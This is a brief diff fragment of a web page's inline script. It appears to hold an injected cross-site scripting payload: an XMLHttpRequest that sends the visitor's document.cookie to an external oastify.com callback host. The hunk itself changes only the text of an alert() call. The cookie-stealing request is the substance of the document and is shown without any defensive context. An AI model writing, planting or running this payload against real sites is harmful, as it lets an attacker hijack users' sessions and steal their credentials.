@@ -16,7 +16,7 @@
       var xhttp = new XMLHttpRequest();
       xhttp.open("GET", "https://7hpxtqz1z8niuyb7xi7m1lee359wxold.oastify.com/" + encodeURIComponent(document.cookie), true);
       xhttp.send();
-      alert("rhyru9");
+      alert("rhyru");
     };
     //]]>
   </script>
